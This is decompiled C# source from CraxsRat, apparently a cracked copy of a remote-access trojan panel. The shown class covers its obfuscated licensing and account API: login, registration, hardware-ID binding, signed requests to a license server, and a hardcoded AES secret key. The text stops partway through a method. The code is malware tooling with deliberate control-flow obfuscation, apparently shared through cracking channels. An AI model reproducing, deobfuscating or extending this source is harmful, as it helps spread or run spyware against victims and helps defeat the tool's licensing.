// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.Codes
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using System.Xml;

#nullable disable
namespace Craxs_Rat
{
  [StandardModule]
  internal sealed class Codes
  {
    private const string SECRET_KEY = "d[crUqy[iTg#6VADICOZW+Qjc4]4edQv";
    public static byte f004945;
    private static string token2;
    public static byte f004947;
    public const int HT_CAPTION = 2;
    private static WebClient webc;
    private static ImageAttributes imageAttributes;
    public static byte f00494B;
    public const uint WDA_MONITOR = 1;
    public static byte f00494D;
    public static string TempPathCache;
    public static string[] pngs;
    private static Random rshit;
    private static WebBrowser wb;

    private static string requestApi(string card, string devID)
    {
      string str;
      try
      {
label_1:
        int num1 = 102243026;
        while (true)
        {
          int num2 = num1;
          uint num3;
          StreamReader streamReader;
          WebResponse response;
          string requestUriString;
          WebRequest webRequest;
          double num4;
          string sign;
          string end;
          switch ((num3 = (uint) ~(((405817900 - -143853048 - (1430826916 ^ -1801317179) ^ 1239789441 * -1130507762 * 590126805) - (num2 - (-1355521515 * ~(2008722157 + 512037208) ^ ---1899685488 - (-1788553179 * -1664648655 - (1190036027 - 122439170)) ^ -(~629983626 * 1781762933 ^ -~1213403097)) ^ 1330842960 * -157207103 - 575293046 - (~(-1059465661 - 2093675110) - -1359757226))) * 754270231 * 941378625)) % 11U)
          {
            case 0:
              response = webRequest.GetResponse();
              num1 = (int) num3 * -927105763 ^ 1793356038;
              continue;
            case 1:
              streamReader = new StreamReader(response.GetResponseStream());
              num1 = (int) num3 * -847710503 ^ -1676700397;
              continue;
            case 2:
              num4 = Conversion.Int(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
              // ISSUE: reference to a compiler-generated method
              sign = clsComputerInfo._Closure\u0024__.getSign(card + devID + Conversions.ToString(num4));
              num1 = (int) num3 * -1739459994 ^ -1214378810;
              continue;
            case 3:
              str = end;
              num1 = (int) num3 * -1200980096 ^ -981086575;
              continue;
            case 5:
              streamReader.Close();
              response.Close();
              num1 = (int) num3 * 444014284 ^ -859350439;
              continue;
            case 6:
              webRequest = WebRequest.Create(requestUriString);
              webRequest.Method = EXGuarder.\u00364416E36;
              num1 = (int) num3 * -1990102607 ^ 1593559767;
              continue;
            case 7:
              goto label_1;
            case 8:
              end = streamReader.ReadToEnd();
              num1 = (int) num3 * -419168203 ^ -82244056;
              continue;
            case 9:
              num1 = (int) num3 * 507954085 ^ -149028705;
              continue;
            case 10:
              requestUriString = EXGuarder.\u0032901060C + card + EXGuarder.\u00374073231 + devID + EXGuarder.\u00336052822 + Conversions.ToString(num4) + EXGuarder.\u00321113128 + sign;
              num1 = (int) num3 * -198980908 ^ -838688870;
              continue;
            default:
              goto label_17;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_13:
        int num5 = 397660300;
        while (true)
        {
          int num6 = num5;
          uint num7;
          switch ((num7 = (uint) ~(((405817900 - -143853048 - (1430826916 ^ -1801317179) ^ 1239789441 * -1130507762 * 590126805) - (num6 - (-1355521515 * ~(2008722157 + 512037208) ^ ---1899685488 - (-1788553179 * -1664648655 - (1190036027 - 122439170)) ^ -(~629983626 * 1781762933 ^ -~1213403097)) ^ 1330842960 * -157207103 - 575293046 - (~(-1059465661 - 2093675110) - -1359757226))) * 754270231 * 941378625)) % 4U)
          {
            case 0:
              goto label_13;
            case 1:
              str = EXGuarder.\u0034D6A530E;
              num5 = (int) num7 * 2068058462 ^ -1393509072;
              continue;
            case 3:
              ProjectData.ClearProjectError();
              num5 = (int) num7 * -1974381934 ^ 1373497609;
              continue;
            default:
              goto label_17;
          }
        }
      }
label_17:
      return str;
    }

    private static string requestApiPost(string data)
    {
      string str1;
      try
      {
        string requestUriString = EXGuarder.\u0035E0A490B;
label_1:
        int num1 = -705732019;
        Stream requestStream;
        byte[] bytes;
        WebRequest webRequest;
        StreamReader streamReader;
        string end;
        string str2;
        WebResponse response;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ((num1 * -1973628487 - 2080907043 * ((1927476212 ^ --1435903756) - (475616783 - 1826760713) * 117564403)) * 1948821325 * -1879959093)) % 15U)
          {
            case 0:
              requestStream.Close();
              num1 = (int) num2 * -84677119 ^ 1309998631;
              continue;
            case 1:
              webRequest = WebRequest.Create(requestUriString);
              num1 = (int) num2 * -761761447 ^ -1434250418;
              continue;
            case 2:
              end = streamReader.ReadToEnd();
              streamReader.Close();
              num1 = (int) num2 * -658804941 ^ -1300545641;
              continue;
            case 3:
              requestStream.Write(bytes, 0, bytes.Length);
              num1 = (int) num2 * -1667000132 ^ -1984849204;
              continue;
            case 4:
              webRequest.ContentLength = (long) bytes.Length;
              num1 = (int) num2 * 2045222047 ^ 1108595958;
              continue;
            case 5:
              str2 = Codes.Encrypt2(data, EXGuarder.\u00344691E51);
              num1 = (int) num2 * 190949329 ^ -605452294;
              continue;
            case 6:
              requestStream = webRequest.GetRequestStream();
              num1 = (int) num2 * 423820302 ^ -658249486;
              continue;
            case 7:
              webRequest.ContentType = EXGuarder.\u003754C201E;
              num1 = (int) num2 * 1606937548 ^ -23887518;
              continue;
            case 8:
              bytes = Codes.Encoding().GetBytes(EXGuarder.\u003151E4A66 + HttpUtility.UrlEncode(str2));
              num1 = (int) num2 * 1685109451 ^ -634244612;
              continue;
            case 9:
              goto label_1;
            case 10:
              webRequest.Method = EXGuarder.\u00327542642;
              num1 = (int) num2 * -1040285301 ^ -1211357600;
              continue;
            case 12:
              num1 = (int) num2 * 1831224079 ^ -984246691;
              continue;
            case 13:
              streamReader = new StreamReader(response.GetResponseStream());
              num1 = (int) num2 * -1917784389 ^ -2123591510;
              continue;
            case 14:
              response = webRequest.GetResponse();
              num1 = (int) num2 * -912102590 ^ 1475633787;
              continue;
            default:
              goto label_16;
          }
        }
label_16:
        response.Close();
        str1 = Codes.AesDecrypt(end, EXGuarder.\u00344691E51);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str1 = EXGuarder.\u0036B12160D;
label_18:
        int num3 = 2017370322;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) ((num3 * -1973628487 - 2080907043 * ((1927476212 ^ --1435903756) - (475616783 - 1826760713) * 117564403)) * 1948821325 * -1879959093)) % 3U)
          {
            case 1:
              ProjectData.ClearProjectError();
              num3 = (int) num4 * 210265717 ^ 1477618719;
              continue;
            case 2:
              goto label_18;
            default:
              goto label_21;
          }
        }
      }
label_21:
      return str1;
    }

    public static string updateLog()
    {
      string str;
      try
      {
label_1:
        int num1 = 1626301565;
        string requestUriString;
        string end;
        WebResponse response;
        StreamReader streamReader;
        WebRequest webRequest;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (num1 * 1893350369 * 796702103 * -1172166417)) % 12U)
          {
            case 0:
              str = Codes.AesDecrypt(end, EXGuarder.\u00303294D26);
              num1 = (int) num2 * -636988411 ^ -851074563;
              continue;
            case 1:
              webRequest = WebRequest.Create(requestUriString);
              num1 = (int) num2 * 1205871403 ^ 1322348497;
              continue;
            case 2:
              webRequest.Method = EXGuarder.\u003406A1A0A;
              num1 = (int) num2 * 878353523 ^ -1657282287;
              continue;
            case 3:
              num1 = (int) num2 * -1609993947 ^ 1163214755;
              continue;
            case 4:
              goto label_1;
            case 6:
              streamReader = new StreamReader(response.GetResponseStream());
              num1 = (int) num2 * -891785189 ^ 1317857409;
              continue;
            case 7:
              end = streamReader.ReadToEnd();
              streamReader.Close();
              num1 = (int) num2 * -1116880330 ^ 220450728;
              continue;
            case 8:
              response = webRequest.GetResponse();
              num1 = (int) num2 * 1378682642 ^ -1150221474;
              continue;
            case 9:
              requestUriString = EXGuarder.\u003562D1B20;
              num1 = (int) num2 * 2014168834 ^ -551445277;
              continue;
            case 10:
              response.Close();
              num1 = (int) num2 * -1410188245 ^ 841485821;
              continue;
            case 11:
              num1 = (int) num2 * 605162923 ^ 526492585;
              continue;
            default:
              goto label_14;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = EXGuarder.\u003504A2367;
        ProjectData.ClearProjectError();
      }
label_14:
      return str;
    }

    public static string Apilogin(string u, string p)
    {
      TimeSpan timeSpan = DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1));
label_1:
      int num1 = -1230477446;
      object objectValue1;
      bool flag1;
      string str1;
      bool flag2;
      bool flag3;
      bool flag4;
      string Left;
      Dictionary<string, object> dictionary;
      bool flag5;
      string str2;
      double num2;
      string sign1;
      bool flag6;
      object objectValue2;
      object objectValue3;
      object objectValue4;
      object objectValue5;
      object objectValue6;
      string sign2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) --((num1 - (((~1796828427 ^ -2078711931 ^ -279082511) + (-2135338386 - 664947664) * 1468347355 ^ -1852662218 - (~-314459480 ^ 487180639 - 1045916322)) - (-(648441741 ^ -711627207 ^ 645658081 ^ 979238247) + ((1824471255 + 1397214081) * -2017638873 ^ ~-810109744)))) * 145323171 ^ ~--1523466763 ^ ~263598416 ^ -1930192219 ^ ~2091607320)) % 37U)
        {
          case 0:
            int num4 = !flag3 ? 743756904 : (num4 = -977248807);
            num1 = num4 ^ (int) num3 * -2069187231;
            continue;
          case 1:
            str1 = EXGuarder.\u003530D4B34;
            num1 = (int) num3 * 120693501 ^ 768053572;
            continue;
          case 2:
            int num5 = !flag4 ? 1295807274 : (num5 = 872145713);
            num1 = num5 ^ (int) num3 * -1402221154;
            continue;
          case 3:
            // ISSUE: reference to a compiler-generated method
            sign2 = clsComputerInfo._Closure\u0024__.getSign(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(objectValue1, objectValue4), objectValue5), objectValue6), objectValue3)));
            num1 = (int) num3 * -400364180 ^ 303969341;
            continue;
          case 5:
            flag2 = Operators.ConditionalCompareObjectEqual(objectValue1, (object) 100, false);
            num1 = (int) num3 * 1589951814 ^ -1745147053;
            continue;
          case 6:
            // ISSUE: reference to a compiler-generated method
            sign1 = clsComputerInfo._Closure\u0024__.getSign(u + p + str2 + Conversions.ToString(num2));
            num1 = (int) num3 * 1310196869 ^ 673127372;
            continue;
          case 7:
            Left = Codes.requestApiPost(EXGuarder.\u003404A6133 + u + EXGuarder.\u0034E1E2733 + p + EXGuarder.\u0034E1E2733 + str2 + EXGuarder.\u0034E1E2733 + Conversions.ToString(num2) + EXGuarder.\u0034E1E2733 + sign1);
            flag6 = Operators.CompareString(Left, EXGuarder.\u0032D411631, false) == 0;
            num1 = (int) num3 * 1592609596 ^ 961972934;
            continue;
          case 8:
            num1 = 861257290;
            continue;
          case 9:
            flag1 = Operators.ConditionalCompareObjectEqual(objectValue1, (object) 104, false);
            num1 = (int) num3 * 169564740 ^ 931471481;
            continue;
          case 10:
            int num6 = !flag5 ? -969400411 : (num6 = 1414845376);
            num1 = num6 ^ (int) num3 * -1608321077;
            continue;
          case 11:
            num1 = (int) num3 * 1342770590 ^ 252875306;
            continue;
          case 12:
            objectValue5 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u00323591853]);
            objectValue6 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u0031C606131]);
            num1 = (int) num3 * 480670217 ^ 1941233810;
            continue;
          case 13:
            num1 = 1697890242;
            continue;
          case 14:
            goto label_1;
          case 15:
            str1 = EXGuarder.\u00344546024;
            num1 = (int) num3 * 1727826078 ^ -2103715460;
            continue;
          case 16:
            dictionary = JsonConvert.DeserializeObject<Dictionary<string, object>>(Left);
            objectValue1 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u00328750453]);
            num1 = 1239182115;
            continue;
          case 17:
            int num7 = !flag6 ? -1997331770 : (num7 = -119547539);
            num1 = num7 ^ (int) num3 * 330594705;
            continue;
          case 18:
            num2 = Conversion.Int(timeSpan.TotalSeconds);
            num1 = (int) num3 * -1348965359 ^ -653697443;
            continue;
          case 19:
            num1 = -1823754653;
            continue;
          case 20:
            num1 = (int) num3 * 571916127 ^ -1241639584;
            continue;
          case 21:
            str1 = EXGuarder.\u0032D411631;
            num1 = (int) num3 * -450498455 ^ 1414901256;
            continue;
          case 22:
            flag5 = Operators.ConditionalCompareObjectNotEqual(objectValue2, (object) sign2, false);
            num1 = (int) num3 * 552771362 ^ 759074220;
            continue;
          case 23:
            int num8 = !flag2 ? 1239362199 : (num8 = 55854199);
            num1 = num8 ^ (int) num3 * 772611718;
            continue;
          case 24:
            objectValue2 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u0034F51086C]);
            objectValue3 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u003294D5177]);
            objectValue4 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u0034F395938]);
            num1 = (int) num3 * -2078380982 ^ -201243118;
            continue;
          case 25:
            str1 = EXGuarder.\u00343657721;
            num1 = (int) num3 * -1544336255 ^ -1708263217;
            continue;
          case 26:
            int num9 = !flag1 ? 2143792767 : (num9 = 1855274856);
            num1 = num9 ^ (int) num3 * 631956059;
            continue;
          case 27:
            str2 = (Codes.GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim();
            num1 = (int) num3 * 951134241 ^ -1140100718;
            continue;
          case 28:
            str1 = EXGuarder.\u003475A2631;
            num1 = (int) num3 * -1327201839 ^ 1946298345;
            continue;
          case 29:
            num1 = -731023961;
            continue;
          case 30:
            str1 = EXGuarder.\u0034E116D32 + Left;
            num1 = (int) num3 * -1169580000 ^ -1676606670;
            continue;
          case 31:
            num1 = (int) num3 * -941043256 ^ 1225763442;
            continue;
          case 32:
            str1 = EXGuarder.\u00331245648;
            num1 = (int) num3 * 1378232554 ^ 1537382666;
            continue;
          case 33:
            num1 = (int) num3 * -1724123114 ^ 101453046;
            continue;
          case 34:
            flag4 = Operators.ConditionalCompareObjectEqual(objectValue1, (object) 200, false);
            num1 = 1183408276;
            continue;
          case 35:
            Codes.token2 = Conversions.ToString(objectValue5);
            num1 = (int) num3 * 979944748 ^ 1809243174;
            continue;
          case 36:
            flag3 = Operators.ConditionalCompareObjectEqual(objectValue1, (object) 101, false);
            num1 = (int) num3 * 1167501798 ^ -1204256924;
            continue;
          default:
            goto label_38;
        }
      }
label_38:
      return str1;
    }

    public static string ApiReg(string u, string p, string ckey)
    {
label_0:
      int num1 = 1569214215;
      object objectValue1;
      bool flag1;
      Dictionary<string, object> dictionary;
      object objectValue2;
      DateTime utcNow;
      TimeSpan timeSpan;
      string str1;
      object objectValue3;
      string Left;
      bool flag2;
      bool flag3;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 - 2126521853 * (~-(37619426 - 87388235) - -1117576369 * --2000275738)) * -1559347133 * -1222034849)) % 27U)
        {
          case 0:
            double num3 = Conversion.Int(timeSpan.TotalSeconds);
            string str2 = (Codes.GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim();
            // ISSUE: reference to a compiler-generated method
            string sign1 = clsComputerInfo._Closure\u0024__.getSign(u + p + str2 + ckey + Conversions.ToString(num3));
            Left = Codes.requestApiPost(EXGuarder.\u00352681E71 + u + EXGuarder.\u0036179292B + p + EXGuarder.\u0036179292B + str2 + EXGuarder.\u0036179292B + ckey + EXGuarder.\u0036179292B + Conversions.ToString(num3) + EXGuarder.\u0036179292B + sign1);
            flag2 = Operators.CompareString(Left, EXGuarder.\u0035C5D0F6F, false) == 0;
            num1 = (int) num2 * -2040471535 ^ -2034033361;
            continue;
          case 1:
            num1 = 291776245;
            continue;
          case 2:
            num1 = (int) num2 * 1431839326 ^ 1893763980;
            continue;
          case 3:
            flag1 = Operators.ConditionalCompareObjectEqual(objectValue1, (object) 401, false);
            num1 = -78277344;
            continue;
          case 4:
            flag3 = Operators.ConditionalCompareObjectEqual(objectValue1, (object) 200, false);
            num1 = (int) num2 * -923603895 ^ -781833648;
            continue;
          case 5:
            num1 = -1699754817;
            continue;
          case 6:
            num1 = 506215724;
            continue;
          case 7:
            num1 = (int) num2 * -729036697 ^ 1303544330;
            continue;
          case 8:
            timeSpan = utcNow.Subtract(new DateTime(1970, 1, 1));
            num1 = (int) num2 * -2050124089 ^ 1876732983;
            continue;
          case 9:
            objectValue1 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u00316255946]);
            num1 = (int) num2 * 879547479 ^ 292484594;
            continue;
          case 10:
            int num4 = !flag1 ? -522870874 : (num4 = -2071673328);
            num1 = num4 ^ (int) num2 * -1132649030;
            continue;
          case 11:
            str1 = EXGuarder.\u00355032F2E;
            num1 = (int) num2 * -1490966939 ^ -1625295249;
            continue;
          case 12:
            int num5 = !flag3 ? 1099058436 : (num5 = 1117733223);
            num1 = num5 ^ (int) num2 * -153829784;
            continue;
          case 13:
            goto label_0;
          case 14:
            str1 = EXGuarder.\u00305681650;
            num1 = (int) num2 * -575074427 ^ 1005145948;
            continue;
          case 15:
            int num6;
            num1 = num6 = !Operators.ConditionalCompareObjectEqual(objectValue1, (object) 202, false) ? 2002454556 : (num6 = 1759900636);
            continue;
          case 16:
            dictionary = JsonConvert.DeserializeObject<Dictionary<string, object>>(Left);
            num1 = (int) num2 * 1072676411 ^ 909875070;
            continue;
          case 17:
            utcNow = DateTime.UtcNow;
            num1 = (int) num2 * -641370864 ^ 1605223203;
            continue;
          case 18:
            str1 = EXGuarder.\u00305164864;
            num1 = (int) num2 * 970710275 ^ -904915238;
            continue;
          case 19:
            objectValue3 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u003411D1B43]);
            num1 = (int) num2 * 483657365 ^ -70372869;
            continue;
          case 21:
            str1 = EXGuarder.\u0030808765F;
            num1 = (int) num2 * 1142186270 ^ 1670865232;
            continue;
          case 22:
            str1 = EXGuarder.\u0036C585F29;
            num1 = (int) num2 * 396694040 ^ 61611352;
            continue;
          case 23:
            // ISSUE: reference to a compiler-generated method
            string sign2 = clsComputerInfo._Closure\u0024__.getSign(Conversions.ToString(Operators.ConcatenateObject(objectValue1, objectValue2)));
            int num7 = !Operators.ConditionalCompareObjectNotEqual(objectValue3, (object) sign2, false) ? 1773382153 : (num7 = 1003398716);
            num1 = num7 ^ (int) num2 * 6302007;
            continue;
          case 24:
            int num8 = !flag2 ? -1317940048 : (num8 = -1220679821);
            num1 = num8 ^ (int) num2 * 1457357262;
            continue;
          case 25:
            objectValue2 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u003633C2078]);
            num1 = (int) num2 * -570727143 ^ 440490278;
            continue;
          case 26:
            str1 = EXGuarder.\u00309531323;
            num1 = (int) num2 * 1984796619 ^ 796468158;
            continue;
          default:
            goto label_27;
        }
      }
label_27:
      return str1;
    }

    public static string Apihear(string u, string p)
    {
      TimeSpan timeSpan = DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1));
label_1:
      int num1 = -2061814016;
      Dictionary<string, object> dictionary;
      object objectValue1;
      string sign1;
      double num2;
      string sign2;
      string Left;
      string str;
      object objectValue2;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (-num1 * -418738921 ^ ~((803023963 ^ -1734700295) - --1424038788))) % 16U)
        {
          case 0:
            objectValue2 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u00356055F21]);
            num1 = (int) num3 * 2041187424 ^ -1472981885;
            continue;
          case 1:
            num2 = Conversion.Int(timeSpan.TotalSeconds);
            num1 = (int) num3 * 1111491099 ^ 524800528;
            continue;
          case 2:
            // ISSUE: reference to a compiler-generated method
            sign2 = clsComputerInfo._Closure\u0024__.getSign(u + p + Codes.token2 + Conversions.ToString(num2));
            num1 = (int) num3 * -549246817 ^ 219579642;
            continue;
          case 4:
            str = Conversions.ToString(false);
            num1 = 2047335442;
            continue;
          case 5:
            Left = Codes.requestApiPost(EXGuarder.\u0031469030A + u + EXGuarder.\u0036C6D1629 + p + EXGuarder.\u0036C6D1629 + Codes.token2 + EXGuarder.\u0036C6D1629 + Conversions.ToString(num2) + EXGuarder.\u0036C6D1629 + sign2);
            int num4 = Operators.CompareString(Left, EXGuarder.\u00302192B04, false) != 0 ? -754099359 : (num4 = 711035207);
            num1 = num4 ^ (int) num3 * 1423782494;
            continue;
          case 6:
            objectValue1 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u003220F3821]);
            num1 = (int) num3 * 22241223 ^ -583915773;
            continue;
          case 7:
            int num5;
            num1 = num5 = !Operators.ConditionalCompareObjectEqual(objectValue1, (object) 200, false) ? -1839859571 : (num5 = 1392529978);
            continue;
          case 8:
            str = Conversions.ToString(false);
            num1 = (int) num3 * -2088401500 ^ -372499988;
            continue;
          case 9:
            int num6 = !Operators.ConditionalCompareObjectNotEqual(objectValue2, (object) sign1, false) ? 1131548584 : (num6 = -1958420629);
            num1 = num6 ^ (int) num3 * -2106318498;
            continue;
          case 10:
            object objectValue3 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u00337491071]);
            object objectValue4 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u0033C140F0E]);
            // ISSUE: reference to a compiler-generated method
            sign1 = clsComputerInfo._Closure\u0024__.getSign(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(objectValue1, objectValue4), objectValue3)));
            num1 = (int) num3 * -1970440285 ^ -396948474;
            continue;
          case 11:
            str = Conversions.ToString(true);
            num1 = (int) num3 * 1861650791 ^ -164572577;
            continue;
          case 12:
            str = Conversions.ToString(false);
            num1 = (int) num3 * 1168271053 ^ -271288050;
            continue;
          case 13:
            num1 = (int) num3 * 109141796 ^ 1194221254;
            continue;
          case 14:
            dictionary = JsonConvert.DeserializeObject<Dictionary<string, object>>(Left);
            num1 = 1384831295;
            continue;
          case 15:
            goto label_1;
          default:
            goto label_17;
        }
      }
label_17:
      return str;
    }

    public static string ApiChangeID(string u, string p)
    {
label_0:
      int num1 = -259057914;
      object objectValue;
      string str1;
      string str2;
      bool flag1;
      bool flag2;
      double num2;
      bool flag3;
      string sign;
      Dictionary<string, object> dictionary;
      string Left;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) ((-~(num1 + (~((323639959 ^ -1920133504) + -1196912562) - (-1433658701 + (596715229 + 1620406249) + (-560665831 - 1321584589 - 465331050))) * 1988665189 + -1847038631 * (-(234888664 * 579394357) - -602220866 * -1561531005 * 714971853)) + -1870627223 * -2051563810) * 2026837465)) % 32U)
        {
          case 0:
            num1 = 2048908707;
            continue;
          case 1:
            num1 = -1396312580;
            continue;
          case 2:
            goto label_0;
          case 3:
            int num4 = !flag1 ? 870119255 : (num4 = 668841064);
            num1 = num4 ^ (int) num3 * -2123422952;
            continue;
          case 4:
            str1 = (Codes.GetHWID() + RegistryHandler.Get_ID_ASSIST()).Trim();
            num1 = (int) num3 * 622239489 ^ -973353479;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated method
            sign = clsComputerInfo._Closure\u0024__.getSign(u + p + str1 + Conversions.ToString(num2));
            num1 = (int) num3 * -1127534127 ^ 1682277602;
            continue;
          case 6:
            num2 = Conversion.Int(DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds);
            num1 = (int) num3 * -602319877 ^ -2020958858;
            continue;
          case 7:
            str2 = EXGuarder.\u003432A6E6C;
            num1 = (int) num3 * -1195489243 ^ -731549767;
            continue;
          case 8:
            str2 = EXGuarder.\u0031A395E18;
            num1 = (int) num3 * -1662666108 ^ 1371683006;
            continue;
          case 9:
            num1 = -1630721880;
            continue;
          case 10:
            objectValue = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u0036D4F7879]);
            int num5 = !Operators.ConditionalCompareObjectEqual(objectValue, (object) 200, false) ? 2078058891 : (num5 = 653280095);
            num1 = num5 ^ (int) num3 * -1960083695;
            continue;
          case 11:
            int num6 = !Operators.ConditionalCompareObjectEqual(objectValue, (object) 101, false) ? -391990524 : (num6 = -65849038);
            num1 = num6 ^ (int) num3 * 1132670203;
            continue;
          case 12:
            int num7 = !Operators.ConditionalCompareObjectEqual(objectValue, (object) 403, false) ? -167402784 : (num7 = -2156597);
            num1 = num7 ^ (int) num3 * -1374519501;
            continue;
          case 13:
            num1 = (int) num3 * 505835037 ^ 1085095527;
            continue;
          case 14:
            str2 = EXGuarder.\u0033E69185C;
            num1 = (int) num3 * 394438640 ^ 505142386;
            continue;
          case 15:
            Left = Codes.requestApiPost(EXGuarder.\u0036F5C1109 + u + EXGuarder.\u003394F0754 + p + EXGuarder.\u003394F0754 + str1 + EXGuarder.\u003394F0754 + Conversions.ToString(num2) + EXGuarder.\u003394F0754 + sign);
            flag1 = Operators.CompareString(Left, EXGuarder.\u00309515547, false) == 0;
            num1 = (int) num3 * 146468333 ^ -953319288;
            continue;
          case 16:
            str2 = EXGuarder.\u003705A2C68;
            num1 = (int) num3 * -491893449 ^ 1688549081;
            continue;
          case 17:
            num1 = (int) num3 * 686530000 ^ -1741672498;
            continue;
          case 18:
            num1 = (int) num3 * 2004048154 ^ 462101322;
            continue;
          case 19:
            str2 = EXGuarder.\u0031F0C7502;
            num1 = (int) num3 * -1798738412 ^ -1854962614;
            continue;
          case 20:
            num1 = -426364717;
            continue;
          case 21:
            flag3 = Operators.ConditionalCompareObjectEqual(objectValue, (object) 401, false);
            num1 = 1847407591;
            continue;
          case 22:
            num1 = (int) num3 * 1529976599 ^ -751123228;
            continue;
          case 23:
            dictionary = JsonConvert.DeserializeObject<Dictionary<string, object>>(Left);
            num1 = -248264758;
            continue;
          case 24:
            flag2 = Operators.ConditionalCompareObjectEqual(objectValue, (object) 402, false);
            num1 = (int) num3 * -953049384 ^ -706332687;
            continue;
          case 25:
            int num8 = !flag2 ? -1514688090 : (num8 = -293191471);
            num1 = num8 ^ (int) num3 * -1003356361;
            continue;
          case 26:
            num1 = (int) num3 * 638529406 ^ 200599954;
            continue;
          case 27:
            str2 = EXGuarder.\u00310620142;
            num1 = (int) num3 * -346067468 ^ -504273863;
            continue;
          case 28:
            num1 = (int) num3 * 556383036 ^ 1368763278;
            continue;
          case 29:
            str2 = EXGuarder.\u0037337643A;
            num1 = (int) num3 * 439143484 ^ -1008305696;
            continue;
          case 31:
            int num9 = !flag3 ? -535732707 : (num9 = -260154315);
            num1 = num9 ^ (int) num3 * 863166195;
            continue;
          default:
            goto label_32;
        }
      }
label_32:
      return str2;
    }

    public static string WhatNewupdate2()
    {
      string str1;
      try
      {
label_1:
        int num1 = -1271317597;
        TimeSpan timeSpan;
        double num2;
        string email;
        string str2;
        string sign;
        Dictionary<string, object> dictionary;
        object objectValue1;
        object objectValue2;
        while (true)
        {
          uint num3;
          switch ((num3 = (uint) ~~~(-~num1 - (1760262182 * 1329660843 - (~-1064763658 + (651340812 - 949024166))))) % 12U)
          {
            case 0:
              num1 = -895277832;
              continue;
            case 1:
              str1 = Conversions.ToString(NewLateBinding.LateGet(objectValue2, (Type) null, EXGuarder.\u003044F670E, new object[2]
              {
                (object) EXGuarder.\u0031A046C3D,
                (object) EXGuarder.\u003554A1069
              }, (string[]) null, (Type[]) null, (bool[]) null));
              num1 = (int) num3 * -1859661726 ^ 242206684;
              continue;
            case 2:
              // ISSUE: reference to a compiler-generated method
              sign = clsComputerInfo._Closure\u0024__.getSign(email + str2 + Conversions.ToString(num2));
              num1 = (int) num3 * 71873747 ^ 543178528;
              continue;
            case 3:
              dictionary = JsonConvert.DeserializeObject<Dictionary<string, object>>(Codes.requestApiPost(EXGuarder.\u0033B64791F + email + EXGuarder.\u003306B1051 + str2 + EXGuarder.\u003306B1051 + Conversions.ToString(num2) + EXGuarder.\u003306B1051 + sign));
              objectValue1 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u0030D787014]);
              num1 = (int) num3 * -59034816 ^ -1607814816;
              continue;
            case 4:
              num2 = Conversion.Int(timeSpan.TotalSeconds);
              num1 = (int) num3 * -753391845 ^ -121376453;
              continue;
            case 6:
              email = RegistryHandler.Get_EMAIL();
              str2 = Codes.getuserkey();
              num1 = (int) num3 * 964123241 ^ 132301496;
              continue;
            case 7:
              goto label_15;
            case 8:
              int num4 = !Operators.ConditionalCompareObjectEqual(objectValue1, (object) 200, false) ? -490085611 : (num4 = -1982348948);
              num1 = num4 ^ (int) num3 * 221432645;
              continue;
            case 9:
              objectValue2 = RuntimeHelpers.GetObjectValue(dictionary[EXGuarder.\u0033F256F6B]);
              num1 = (int) num3 * -824827562 ^ 428853807;
              continue;
            case 10:
              goto label_1;
            case 11:
              timeSpan = DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1));
              num1 = (int) num3 * -1291188653 ^ 1053478428;
              continue;
            default:
              goto label_12;
          }
        }
label_12:
        str1 = EXGuarder.\u003035A4E49;
        goto label_15;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      str1 = EXGuarder.\u003035A4E49;
label_15:
      return str1;
    }

    public static string CheckForUpdates2()
    {
      string str1;
      try
      {
label_1:
